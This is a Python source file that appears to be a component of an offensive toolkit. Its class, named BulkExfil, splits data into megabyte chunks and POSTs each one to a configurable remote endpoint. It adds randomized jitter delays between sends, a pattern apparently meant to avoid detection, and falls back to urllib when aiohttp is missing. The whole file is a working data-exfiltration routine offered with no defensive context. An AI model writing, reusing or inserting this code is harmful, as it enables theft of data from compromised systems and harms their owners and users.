import asyncio, random, time

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


class BulkExfil:
    def __init__(self, endpoint: str, headers: dict = None):
        self.endpoint = endpoint
        self.headers = headers or {}

    async def exfil(self, data: str, chunk_size: int = 1048576, jitter: tuple = (0.1, 0.3)) -> dict:
        if not HAS_AIOHTTP:
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(None, self._urllib_exfil, data, chunk_size, jitter)
        raw = data.encode()
        chunks = [raw[i:i+chunk_size] for i in range(0, len(raw), chunk_size)]
        results = []
        async with aiohttp.ClientSession(headers=self.headers, timeout=aiohttp.ClientTimeout(total=30)) as session:
            for i, chunk in enumerate(chunks):
                sent = False
                error = None
                try:
                    async with session.post(
                        self.endpoint,
                        data=chunk,
                        headers={"X-Part": str(i), "X-Total-Parts": str(len(chunks))},
                    ) as resp:
                        sent = resp.status < 400
                        if not sent:
                            error = f"HTTP {resp.status}"
                except Exception as e:
                    error = str(e)
                results.append({"seq": i, "size": len(chunk), "sent": sent, "error": error})
                if i < len(chunks) - 1:
                    await asyncio.sleep(random.uniform(*jitter))

        return {
            "method": "bulk_http",
            "endpoint": self.endpoint,
            "total_chunks": len(chunks),
            "sent": sum(1 for r in results if r["sent"]),
            "failed": sum(1 for r in results if not r["sent"]),
            "results": results,
        }

    def _urllib_exfil(self, data: str, chunk_size: int, jitter: tuple) -> dict:
        import urllib.request
        raw = data.encode()
        chunks = [raw[i:i+chunk_size] for i in range(0, len(raw), chunk_size)]
        results = []
        for i, chunk in enumerate(chunks):
            sent = False
            error = None
            try:
                req = urllib.request.Request(
                    self.endpoint,
                    data=chunk,
                    headers={"X-Part": str(i), "X-Total-Parts": str(len(chunks))},
                    method="POST",
                )
                urllib.request.urlopen(req, timeout=30)
                sent = True
            except Exception as e:
                error = str(e)
            results.append({"seq": i, "size": len(chunk), "sent": sent, "error": error})
            time.sleep(random.uniform(*jitter))

        return {
            "method": "bulk_http_urllib",
            "endpoint": self.endpoint,
            "total_chunks": len(chunks),
            "sent": sum(1 for r in results if r["sent"]),
            "failed": sum(1 for r in results if not r["sent"]),
            "results": results,
        }
